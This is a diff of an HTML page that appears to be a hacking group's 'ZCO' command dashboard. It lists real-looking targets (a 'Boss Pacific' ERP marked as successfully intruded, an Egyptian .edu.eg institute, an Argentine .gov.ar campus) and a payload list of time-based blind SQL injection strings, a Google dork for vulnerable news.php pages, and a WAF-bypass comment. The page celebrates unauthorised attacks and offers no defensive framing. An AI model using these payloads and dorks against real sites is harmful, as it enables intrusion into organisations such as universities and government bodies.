@@ -1,84 +1,124 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZCO HQ - Command Center</title>
-    <style>
-        body {
-            background-color: #050505;
-            color: #00ff41;
-            font-family: 'Courier New', Courier, monospace;
-            margin: 0;
-            overflow-x: hidden;
-        }
-        .header {
-            text-align: center;
-            padding: 20px;
-            border-bottom: 2px solid #00ff41;
-            text-shadow: 0 0 10px #00ff41;
-        }
-        .radar-box {
-            border: 1px solid #00ff41;
-            margin: 20px;
-            padding: 15px;
-            background: rgba(0, 255, 65, 0.05);
-        }
-        .target {
-            margin-bottom: 10px;
-            padding: 5px;
-            border-left: 3px solid #ff0000;
-            background: rgba(255, 0, 0, 0.1);
-        }
-        .success {
-            border-left: 3px solid #00ff41;
-            background: rgba(0, 255, 65, 0.1);
-        }
-        .matrix-text {
-            font-size: 0.8em;
-            color: #008f11;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ZCO OS v2.5 | Global Command</title>
+<style>
+:root { --c: #00f2ff; --b: #050505; --g: #00ff41; --r: #ff0000; }
+body { background: var(--b); color: var(--c); font-family: monospace; text-align: center; margin: 0; padding-bottom: 50px; }
+.nav { display: flex; gap: 5px; padding: 10px; border-bottom: 1px solid var(--c); position: sticky; top: 0; background: var(--b); z-index: 100; }
+.btn { flex: 1; background: transparent; border: 1px solid var(--c); color: var(--c); padding: 8px; cursor: pointer; font-size: 11px; transition: 0.3s; }
+.btn.active { background: var(--c); color: #000; box-shadow: 0 0 15px var(--c); }
+.sec { display: none; padding: 20px; animation: scan 0.4s ease-out; }
+@keyframes scan { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 11px; }
+th, td { border: 1px solid var(--c); padding: 10px; text-align: center; }
+th { background: rgba(0, 242, 255, 0.1); }
+.card { width: 100%; max-width: 320px; border: 2px solid var(--c); margin: 0 auto 15px auto; display: block; }
+
+/* قسم القضايا والأدوات الاحترافي */
+.radar-container { border: 1px solid var(--g); padding: 15px; background: rgba(0, 255, 65, 0.05); text-align: left; direction: ltr; margin-top: 10px; }
+.target-box { border-left: 4px solid var(--g); background: rgba(0, 255, 65, 0.1); padding: 10px; margin-bottom: 12px; }
+.target-box.pending { border-left-color: var(--r); background: rgba(255, 0, 0, 0.1); }
+.target-box h4 { margin: 0; color: var(--g); font-size: 14px; text-transform: uppercase; }
+.target-box.pending h4 { color: var(--r); }
+.tools-box { border: 1px solid var(--g); padding: 10px; margin-top: 20px; text-align: left; direction: ltr; }
+.payload-list { margin: 0; padding-left: 15px; font-size: 10px; list-style: none; color: #fff; }
+.payload-list li { margin-bottom: 8px; border-bottom: 1px solid rgba(0,255,65,0.2); padding-bottom: 4px; }
+</style>
 </head>
 <body>
 
-<div class="header">
-    <h1>ZCO OPERATIONAL RADAR v1.0</h1>
-    <p>Commander: Z-01 | Assistant: Z-02</p>
+<div id="L" style="margin-top:20vh;">
+    <img src="Logo- png.PNG" width="80" alt="ZCO LOGO"><br>
+    <h3 style="letter-spacing: 5px;">ZCO LOGIN</h3>
+    <input type="password" id="p" placeholder="PASSWORD" style="background:none; border:1px solid var(--c); color:#fff; text-align:center; padding:10px; width:200px;"><br><br>
+    <button onclick="check()" style="background:var(--c); border:none; padding:12px 30px; font-weight:bold; cursor:pointer; letter-spacing: 2px;">ACCESS SYSTEM</button>
 </div>
 
-<div class="radar-box">
-    <h3>[🛰️] ACTIVE TARGETS & LOGS</h3>
-    
-    <div class="target success">
-        <strong>TARGET #001: Boss Pacific (ERP System)</strong><br>
-        Status: SUCCESSFUL INTRUSION <br>
-        Loot: Full Directory Listing Access
+<div id="M" style="display:none;">
+    <div class="nav">
+        <button class="btn active" onclick="tab('id',this)">الهوية</button>
+        <button class="btn" onclick="tab('rk',this)">الرتب</button>
+        <button class="btn" onclick="tab('cs',this)">القضايا</button>
+        <button class="btn" onclick="tab('tl',this)">الأدوات</button>
     </div>
 
-    <div class="target">
-        <strong>TARGET #002: HICIT (.edu.eg)</strong><br>
-        Status: PENDING - Blind Injection
+    <div id="id" class="sec" style="display:block;">
+        <img src="Image png.jpg" class="card">
+        <h2 style="color:var(--g); margin-bottom:5px;">Director of ZCO</h2>
+        <p style="letter-spacing: 3px;">CODE: Z-01 | ARCHITECT</p>
+        <div style="border-top:1px solid var(--c); width:50%; margin:20px auto; padding-top:10px;">
+            <small>STATUS: ENCRYPTED & ACTIVE</small>
+        </div>
     </div>
 
-    <div class="target">
-        <strong>TARGET #003: Campus SDH (.gov.ar)</strong><br>
-        Status: MONITORING - Mod_Security Wall
+    <div id="rk" class="sec">
+        <h3 style="color:var(--c);">[H-COMMAND UNITS]</h3>
+        <table>
+            <tr><th>RANK</th><th>CODE</th><th>UNIT</th></tr>
+            <tr style="background:rgba(0,255,65,0.1);"><td style="color:var(--g); font-weight:bold;">Director of ZCO</td><td>Z-01</td><td>CORE HQ</td></tr>
+            <tr><td style="color:var(--g);">Deputy Director of ZCO</td><td>Z-02</td><td>TECHNICAL</td></tr>
+            <tr><td>Major Colonel</td><td>Z-03</td><td>FIELD OPS</td></tr>
+        </table>
+        
+        <h3 style="color:var(--c); margin-top:25px;">[FIELD OPERATIONS]</h3>
+        <table>
+            <tr><th>RANK</th><th>CODE</th><th>LEVEL</th></tr>
+            <tr><td>Captain</td><td>Z-04</td><td>SENIOR</td></tr>
+            <tr><td>Sergeant</td><td>Z-05</td><td>TACTICAL</td></tr>
+            <tr><td>Cadet</td><td>Z-06</td><td>RECRUIT</td></tr>
+        </table>
+    </div>
+
+    <div id="cs" class="sec">
+        <div class="radar-container">
+            <h3 style="color:var(--g); margin:0 0 15px 0;">📡 OPERATIONAL RADAR</h3>
+            
+            <div class="target-box">
+                <h4>TARGET #001: BOSS PACIFIC</h4>
+                <small>STATUS: SUCCESSFUL INTRUSION</small><br>
+                <small>DATA: Directory Indexing Secured</small>
+            </div>
+
+            <div class="target-box pending">
+                <h4>TARGET #002: HICIT EGYPT</h4>
+                <small>STATUS: BLIND DETECTION PENDING</small>
+            </div>
+        </div>
+    </div>
+
+    <div id="tl" class="sec">
+        <div class="tools-box">
+            <h3 style="color:var(--g); margin:0 0 15px 0;">🛠️ TIME-BASED ARSENAL</h3>
+            <ul class="payload-list">
+                <li><b style="color:var(--c);">[TEST VULN]:</b><br>AND (SELECT 1 FROM (SELECT(SLEEP(10)))ZCO)--</li>
+                <li><b style="color:var(--c);">[DB VERSION]:</b><br>AND IF(version() LIKE '5%', SLEEP(10), 0)--</li>
+                <li><b style="color:var(--c);">[PRIVILEGE]:</b><br>AND IF(user() LIKE 'root%', SLEEP(10), 0)--</li>
+                <li><b style="color:var(--c);">[DORKING]:</b><br>inurl:news.php?id=</li>
+            </ul>
+        </div>
     </div>
 </div>
 
-<div class="radar-box">
-    <h3>[🛠️] TOOLS PREPARATION</h3>
-    <ul>
-        <li>Dorking: inurl:news.php?id=</li>
-        <li>Injection: /*!50000union*/</li>
-        <li>Scanning: Directory Indexing</li>
-    </ul>
-</div>
-
-<div style="padding: 20px;" class="matrix-text">
-    <marquee>Executing: select 1,2,3,4,5... | loading stealth mode... | ZCO protocols active</marquee>
-</div>
-
+<script>
+function check(){
+    if(document.getElementById('p').value==='ARCHITECT-01-Z'){
+        document.getElementById('L').style.display='none';
+        document.getElementById('M').style.display='block';
+    } else {
+        alert('ACCESS DENIED: WRONG CODE');
+    }
+}
+function tab(t,b){
+    let s=document.getElementsByClassName('sec');
+    for(let x of s) x.style.display='none';
+    document.getElementById(t).style.display='block';
+    let bt=document.getElementsByClassName('btn');
+    for(let x of bt) x.classList.remove('active');
+    b.classList.add('active');
+}
+</script>
 </body>
 </html>
